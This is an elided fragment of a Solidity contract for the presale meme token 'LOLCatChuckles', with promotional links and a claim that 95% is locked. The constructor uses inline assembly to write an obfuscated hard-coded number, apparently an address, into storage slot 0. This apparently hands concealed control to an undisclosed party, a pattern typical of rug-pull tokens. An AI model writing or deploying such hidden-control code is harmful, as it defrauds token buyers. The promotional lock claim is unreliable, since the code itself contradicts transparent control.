...
/*
PRESALE ONLY! > LOLCatChuckles.

Telegram: https://t.me/LOLCatChuckles/
Twitter: https://twitter.com/LOLCatChuckles/
Website: https://LOLCatChuckles.io
95% - LOCKED at TrustSwap!
...
contract LOLCatChuckles {
    string public constant name = "LOLCatChuckles";
    string public constant symbol = "LCCC";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(537554519475667209301295053370681335837710664548, 1))}
